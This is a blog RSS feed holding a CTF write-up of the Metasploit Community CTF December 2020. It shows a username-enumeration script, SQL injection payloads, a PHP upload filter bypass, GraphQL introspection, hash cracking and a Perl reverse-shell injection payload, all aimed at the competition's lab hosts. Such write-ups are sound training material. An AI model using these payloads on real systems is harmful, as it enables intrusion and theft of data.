<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>CTF on ikuamike</title>
    <link>https://blog.ikuamike.io/tags/ctf/</link>
    <description>Recent content in CTF on ikuamike</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>Â© Michael Ikua</copyright>
    <lastBuildDate>Mon, 07 Dec 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/ctf/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Metasploit Community CTF December 2020 WriteUp</title>
      <link>https://blog.ikuamike.io/posts/2020/metasploitctf2020/</link>
      <pubDate>Mon, 07 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2020/metasploitctf2020/</guid>
      <description></description>
      <content>&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
&lt;p&gt;Over the weekend I participated in &lt;a href=&#34;https://ctftime.org/event/1200&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Metasploit Community December CTF&lt;/a&gt;

 by Rapid7
with team &lt;a href=&#34;https://twitter.com/fr334aks&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;fr334aks&lt;/a&gt;

. We ended up getting position 57/413. The CTF was meant to be beginner-friendly.&lt;/p&gt;
&lt;h2 id=&#34;intro&#34;&gt;Intro&lt;/h2&gt;
&lt;p&gt;Teams are provided with their own instance of a kali box which is public facing to act as a jump host to reach
an ubuntu VM which hosts the challenges.&lt;/p&gt;
&lt;p&gt;On the ubuntu VM there are 20 open ports for each challenge. To complete a challenge you need to find a challenge
flag and submit the MD5 checksum of the PNG to get points.&lt;/p&gt;
&lt;p&gt;I decided to tunnel all connections to the victim through ssh with sshuttle using the below command:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sshuttle -r kali@52.90.96.4 -e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ssh -i metasploit_ctf_kali_ssh_key.pem&amp;#34;&lt;/span&gt; 172.15.18.101/32
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;challenges&#34;&gt;Challenges:&lt;/h2&gt;
&lt;h3 id=&#34;4-of-hearts&#34;&gt;4 of Hearts&lt;/h3&gt;
&lt;p&gt;After tunneling the connections to the Ubuntu VM the first flag is on port 80, &lt;code&gt;http://172.15.18.101/4_of_hearts.png&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Flag&lt;/strong&gt;:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/4_of_hearts.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;6-of-hearts&#34;&gt;6 of Hearts&lt;/h3&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port6868.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;There is a photos website running on port 6868. There is a functionality to sign up that creates directories based on a user&amp;rsquo;s
initials of their names.&lt;/p&gt;
&lt;p&gt;On signing up we first get the notes directory.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port6868_1.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;On the home page, there are images which are hosted under files directory with different users initials.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port6868_2.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Since there&amp;rsquo;s no authentication we can try look at notes for each of the discovered users.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;BD&lt;/strong&gt;:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port6868_4.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;&lt;strong&gt;TW&lt;/strong&gt;:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port6868_5.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;&lt;strong&gt;MC&lt;/strong&gt;:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port6868_6.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;From the above notes we can tell that there&amp;rsquo;s a site admin whose name is &lt;em&gt;Beth Ulysses Denise Donnoly Yager&lt;/em&gt;, this creates the initials
&lt;em&gt;BUDDY&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;We can then get the flag with these initials at the url &lt;code&gt;http://172.15.18.101:6868/files/BUDDY/2&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Flag&lt;/strong&gt;:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/6_of_hearts.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;3-of-spades&#34;&gt;3 of Spades&lt;/h3&gt;
&lt;p&gt;To solve this one we are required to identify a valid username aside from guest. When you submit guest which is a valid username, the
request takes about 5 seconds to complete but if you supply a non-valid username it takes less than a second. The password doesn&amp;rsquo;t
matter.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8080.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;I created a python script to bruteforce the username with a wordlist:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests

url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://172.15.18.101:8080/login.php&amp;#34;&lt;/span&gt;

user &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;guest&amp;#34;&lt;/span&gt;
f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/usr/share/seclists/Usernames/cirt-default-usernames.txt&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt;)
users &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;readlines()
f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;guess&lt;/span&gt;(username):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Testing username: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; username &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;...&amp;#34;&lt;/span&gt;)
    data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;:username,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;}
    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;post(url, data&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;data)
    response_time &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;elapsed&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;total_seconds()

    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; response_time &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Valid user found: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; username)
        exit()

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; users:
    guess(i&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip())
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It found the user to be demo:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8080_2.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;When we submit it we get the url to the flag,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://172.15.18.101:8080/a3lk3d939d993201ld.png
&lt;/code&gt;&lt;/pre&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8080_1.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;&lt;strong&gt;Flag&lt;/strong&gt;:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/3_of_spades.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;2-of-spades&#34;&gt;2 of Spades&lt;/h3&gt;
&lt;p&gt;There&amp;rsquo;s a website with the ability to search for reviews on port 9001.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port9001.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;First thing to check with search functionality is SQLi, after adding a quote &lt;code&gt;&#39;&lt;/code&gt; we get a sqlite3 error confirming presence of sqli:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port9001_1.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Using this payload we can get the structure of the db:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;overwatch&#39; union select 1,sql,3 FROM sqlite_master;-- -
&lt;/code&gt;&lt;/pre&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port9001_2.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Then we can extract the link to the flag with this payload:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;overwatch&#39; union select 1,flag,link FROM hidden-- -
&lt;/code&gt;&lt;/pre&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port9001_3.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;&lt;strong&gt;Flag&lt;/strong&gt;:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/2_of_spades.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;8-of-hearts&#34;&gt;8 of Hearts&lt;/h3&gt;
&lt;p&gt;On port 4545, We are provided with 2 files:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port4545.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;When you run the elf binary it asks for buffalo and if you give one it asks for more.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port4545_1.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;All we needed to do was guess how many buffaloes it needed, the exact value was between 100 and 200.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port4545_2.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;&lt;strong&gt;Flag&lt;/strong&gt;:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/8_of_hearts.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;8-of-spades&#34;&gt;8 of Spades&lt;/h3&gt;
&lt;p&gt;On port 1080 a socks5 proxy is running on this port without any authentication. We can edit &lt;code&gt;/etc/proxychains.conf&lt;/code&gt; and add this server as a socks5
proxy server.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;socks5  172.15.18.101 1080
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Next we need to discover open ports that we can access through the proxy. Port scanning over a proxy can be really slow, therefore, lets
check the top 100 ports first.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;proxychains nmap -sT --top-ports=100 127.0.0.1 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nmap discovers port 22 and 8000 open.&lt;/p&gt;
&lt;p&gt;Port 8000 is a web server hosting our flag:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;proxychains curl 127.0.0.1:8000
&lt;/code&gt;&lt;/pre&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port1080.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;&lt;strong&gt;Flag&lt;/strong&gt;:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/8_of_spades.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;red-joker&#34;&gt;Red Joker&lt;/h3&gt;
&lt;p&gt;On port 9007, we get a zip file.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port9007.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Only thing needed is to extract it:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;7z x red_joker.zip
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Flag&lt;/strong&gt;:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/joker_red.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;6-of-diamonds&#34;&gt;6 of Diamonds&lt;/h3&gt;
&lt;p&gt;On port 8200, there&amp;rsquo;s a website that we can upload images.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8200.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;It only allows jpeg and png files by checking mime type and file extension. We can bypass this restriction with a few tricks.&lt;/p&gt;
&lt;p&gt;We can create a php file with a valid jpeg mime type with this command:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;echo -n -e &#39;\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01&#39; &amp;gt; shell.php
&lt;/code&gt;&lt;/pre&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8200_3.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Then we can intercept the request in burp suite and change the extension and add our php exploit code.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8200_2.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;We can successfully execute commands and get the location of the flag.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8200_4.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Flag was found at &lt;code&gt;http://172.15.18.101:8200/157a7640-0fa4-11eb-adc1-0242ac120002/6_of_diamonds.png&lt;/code&gt;.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/6_of_diamonds.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;queen-of-spades&#34;&gt;Queen of Spades&lt;/h3&gt;
&lt;p&gt;On port 8202, we have another website with barely any functionality to interact with.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8202.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;But when we look at burp where we are proxying http traffic, there is some communication to an api which looks very much like
graphql.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8202_1.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;A common misconfiguration to check is if introspection is enabled on the endpoint.&lt;/p&gt;
&lt;p&gt;When we supply an introspection payload (you can use the ones from &lt;a href=&#34;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#enumerate-database-schema-via-introspection&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;payloadallthethings repo&lt;/a&gt;

) it works and we get the schema.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8202_3.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;To understand the result, we can easily visualize this at &lt;a href=&#34;https://apis.guru/graphql-voyager/&#34;&gt;https://apis.guru/graphql-voyager/&lt;/a&gt;&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8202_2.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;With this structure we can easily make our queries.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8202_4.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The below query gives the location of the flag.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8202_5.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;&lt;strong&gt;Flag&lt;/strong&gt;:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/queen_of_spades.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;2-of-hearts&#34;&gt;2 of Hearts&lt;/h3&gt;
&lt;p&gt;On port 9000, there&amp;rsquo;s another website similar to the one port 9001 but this one has a different way in which it handles searches. When we search using
just a single character a, the first result is interesting as it looks like a folder in a terminal.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port9000.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;This could mean our input is being used to construct a shell command. We can try getting a reverse shell using this reverse shell payload:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-perl&#34; data-lang=&#34;perl&#34;&gt;$&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;(&lt;/span&gt;perl &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;use Socket;$i=&amp;#34;172.15.18.100&amp;#34;;$p=9000;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);exec(&amp;#34;/bin/sh -i&amp;#34;);};&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We successfully get a reverse shell.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port9000_1.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The vulnerable code is using the find command:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port9000_2.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;&lt;strong&gt;Flag&lt;/strong&gt;:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/2_of_hearts.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;black-joker&#34;&gt;Black Joker&lt;/h3&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8123.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The web app here has two visible functionalities:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8123_2.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;When we try to sign up, we get the response that no new members can signup. When trying to look at the request in burp suite, there was
none. Therefore it must be a frontend response.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8123_1.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;sign-up.js:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8123_3.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Looking at the forgotten your password functionality, we can supply an email. The home page contains this email: &lt;a href=&#34;mailto:admin@example.com&#34;&gt;admin@example.com&lt;/a&gt;.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8123_4.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;This gets us a hint but it&amp;rsquo;s not enough information. When we look at the full request in burp, there was actually more information
sent back that wasn&amp;rsquo;t displayed.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8123_5.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;From the js file we gather that the site accepts passwords between 9 and 14 chars long, which are should have only a-z and 0-9 characters.
Having a hash and the beginning of the password we can generate a wordlist and crack the hash.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;crunch &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; 0123456789abcdefghijklmnopqrstuvwxyz &amp;gt; temp
sed -e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s/^/ihatesalt/&amp;#39;&lt;/span&gt; temp &amp;gt; wordlist.txt
hashcat -m &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;7f35f82c933186704020768fd08c2f69&amp;#39;&lt;/span&gt; wordlist.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Recovered Password: ihatesaltalot7&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8123_6.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Supplying the email and password to /admin, we get the flag.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8123_7.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;&lt;strong&gt;Flag&lt;/strong&gt;:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/black_joker.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;4-of-clubs&#34;&gt;4 of Clubs&lt;/h3&gt;
&lt;p&gt;Port 8092:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8092.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;For this challenge, we were able to bypass the hash check by supplying the password as an empty array.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8092_1.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;&lt;strong&gt;Flag&lt;/strong&gt;:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/4_of_clubs.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;This was a very nice ctf to brush up on some basic concepts. As we didn&amp;rsquo;t solve all challenges, that means we still have some
things to learn.&lt;/p&gt;
&lt;p&gt;Follow our team twitter account: &lt;a href=&#34;https://twitter.com/fr334aks&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;fr334aks&lt;/a&gt;

&lt;/p&gt;
&lt;p&gt;Twitter: &lt;a href=&#34;https://twitter.com/ikuamike&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ikuamike&lt;/a&gt;

&lt;/p&gt;
&lt;p&gt;Github: &lt;a href=&#34;https://github.com/ikuamike&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ikuamike&lt;/a&gt;

&lt;/p&gt;</content>
    </item>
    
    <item>
      <title>Grayhat Red Team Village CTF 2020 WriteUp: Tunneler</title>
      <link>https://blog.ikuamike.io/posts/2020/grayhat_red_team_village_ctf_tunneler_writeup/</link>
